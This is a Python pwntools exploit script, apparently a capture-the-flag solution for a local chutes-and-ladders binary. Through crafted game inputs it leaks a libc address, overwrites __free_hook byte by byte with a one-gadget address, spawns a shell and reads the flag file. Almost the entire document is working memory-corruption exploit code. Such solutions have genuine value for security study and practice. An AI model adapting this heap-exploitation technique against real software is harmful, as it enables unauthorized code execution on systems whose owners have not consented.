#!/usr/bin/env python3
# With help from nobodyisnobody
# 4 bits bruteforce.
from pwn import *

exe = ELF("./chutes_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe


def conn():
    r = process([exe.path])
    return r


r = conn()

def sl(a, b):
    r.sendlineafter(a, b)

def numberOfPlayers(num):
    sl("Number of players (max 10): ", str(num).encode())

def sendMarker(m):
    sl(": ", m)

def chutes(first, second):
    sl(": ", b"y")
    
    """
    93 -> 90
    24 -> 14
    68 -> 3
    38 -> 36
    6 -> 2
    This board's ladders are:
    27 -> 35
    1 -> 5
    64 -> 98
    15 -> 26
    30 -> 33
    """

    for i, j in first:
        sl(b": ", str(i) + " " + str(j)) # 5 -> 4 2->1
    

    for i,j in second:
        sl(b": ", str(i) + " " + str(j)) # 2 -> 4

def sendSpin(spin):
    sl(": ", b"n")
    sl(": ", str(spin).encode())
    sl(": ", b"n")

def role(spin):
    sl(": ", "n")
    sl(": ", str(spin))
    sl(": ", "n")

def role_m(character, spin):
    sl(": ", "y")
    sl(": ", bytes([character]))
    sl(": ", str(spin))
    sl(": ", "n")




def main():

    numberOfPlayers(10)
    
    pause()
    for _ in range(10): # 0 1 2 3 4 5 6 7
        sendMarker(b"\x3b")
    #r.interactive()
    chutes([(5, 4), (3, 1) , (9, 0) , (30, 29), (12, 11)], [(2, 4), (0, 1), (50, 70), (78, 80), (12, 0x63-4)])

    
    role(6)
    for j in range(0x2-1):
        for i in range(9):
            role(0)
        role(6)
    for i in range(9):
        role(0)
    role(4)
    leak = int(r.recvline().strip(), 16)
    log.warn("Libc leak @ 0x%x", leak)
    # Need to alloc one and free it to increase the count to two.
    
    role(2)
    for i in range(9):
        role(0)
    
    for i in range(5):
        role(0)
    role(6)
    for i in range(4):
        role(0)
    role(0)
    role(3)
    for i in range(8):
        role(0)
    role(0)
    role(5)

    for i in range(10-2):
        role(0)
    
    role(1)
    # Problems in 1 and 5
    role(3)
    role(0)
    role(0)
    role(0)
    role(3)
    role(0)
    role(0)
    role(0)
    role(0)
    
    role(0)
    libc.address = leak - 0x875a0
    free_hook = libc.sym['__free_hook']
    
    for c in p64(free_hook)[2:7:]:
        print("character ", bytes([c]))
        role_m(c, 4)
    
    role(0)

    for i in range(6):
        role(0)
    role(0)
    role(0)
    role(0)
    role(6)
    role(6)
    role(0)
    
    role_m(0x28-4, 4)
    for i in range(6):
        role(0)
    role(6)
    role(0)
    role(0)
    role(5)

    for i in range(9):
        role(0)
    role_m(0x10, 1)
    # I need 4, 5, 6, 7, 8, 9 to write system.
    # I need to have 2, 3 helping 7 = 0x5f and 8 = 6 to not free
    
    role(0)
    role(2) # 2
    role(2) # 3
    for i in range(10 - 4): #9
        role(0)
    
    role(0)
    role(0)
    role(0) # 2
    role(6) # 3
    for i in range(10 - 4): #9
        role(0)
    
    rip = p64(libc.address + 0xe6c81)
        
    role(0)
    role(0) # 2
    role(0) # 3
    role(0) # 4
    role(0) # 5
    role(0) # 6
    role(2) # 7
    role(6) # 8
    role(0) # 9
    role(0) # 10

    role(0) # 0
    role(0) # 1
    role(0) # 2
    role(0) # 3
    role(0) # 4
    role(0) # 5
    role(0) # 6
    role_m(rip[3], 1) # 7
    role(6) # 8
    role(0) # 9
   
   

    role(0) # 0
    role(0) # 1
    role(0) # 2
    role(0) # 3
    role(5) # 4
    role(5) # 5
    role(0) # 6
    role(0) # 7
    role(4) # 8
    role(0) # 9

   

    role(0) # 0
    role(0) # 1
    role(0) # 2
    role(0) # 3
    role_m(rip[0], 1) # 4
    role_m(rip[1], 1) # 5
    role(0) # 6
    role(0) # 7
    role(0) # 8
    role(0) # 9
    
    role(0) # 0
    role(0) # 1
    role(0) # 2
    role(0) # 3
    role(0) # 4
    role(0) # 5
    role(6) # 6
    role(0) # 7
    role(0) # 8
    role(0) # 9
    
    role(0) # 0
    role(0) # 1
    role(0) # 2
    role(0) # 3
    role(0) # 4
    role(0) # 5
    role(4) # 6
    role(0) # 7
    role(0) # 8
    role(0) # 9
    
    role(5) # 0
    role(0) # 1
    role(0) # 2
    role(0) # 3
    role(0) # 4
    role(0) # 5
    role(0) # 6
    role(0) # 7
    role(0) # 8
    role(0) # 9

    role(6) # 0
    role(0) # 1
    role(0) # 2
    role(0) # 3
    role(0) # 4
    role(0) # 5
    role(0) # 6
    role(0) # 7
    role(0) # 8
    role(0) # 9
    
    role(4) # 0
    role(0) # 1
    role(0) # 2
    role(0) # 3
    role(0) # 4
    role(0) # 5
    role_m(rip[2], 1) # 6
    role(0) # 7
    role_m(rip[4], 1) # 8
    role_m(rip[5], 1) # 9
    
    sl(": ", "n")
    sl(": ", "1")
    r.sendline("cat flag*")

    r.interactive()


if __name__ == "__main__":
    main()
